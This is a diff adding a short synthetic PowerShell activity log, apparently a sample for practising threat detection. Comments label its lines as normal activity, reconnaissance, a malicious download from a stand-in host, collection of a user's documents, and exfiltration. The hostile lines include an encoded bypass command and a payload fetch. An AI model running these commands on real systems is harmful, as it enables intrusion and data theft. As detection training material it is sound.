@@ -1,0 +1,29 @@
+2025-02-01 09:55:12 User login: student
+
+# Normal activity
+2025-02-01 09:57:10 powershell.exe -Command Get-Process
+2025-02-01 09:58:12 powershell.exe -Command Get-Service
+
+# Suspicious start
+2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+
+# Reconnaissance
+2025-02-01 10:03:01 whoami
+2025-02-01 10:03:10 ipconfig
+2025-02-01 10:03:44 net user
+
+# Benign web request
+2025-02-01 10:03:55 powershell.exe -Command Invoke-WebRequest https://microsoft.com/update.exe
+
+# Malicious download
+2025-02-01 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious-site.com/payload.exe
+
+# Collection
+2025-02-01 10:05:33 powershell.exe -Command Compress-Archive C:\Users\student\Documents\data.zip
+
+# Exfiltration
+2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+# Another user normal behaviour
+2025-02-01 11:15:02 User login: admin
+2025-02-01 11:16:12 powershell.exe -Command Get-EventLog
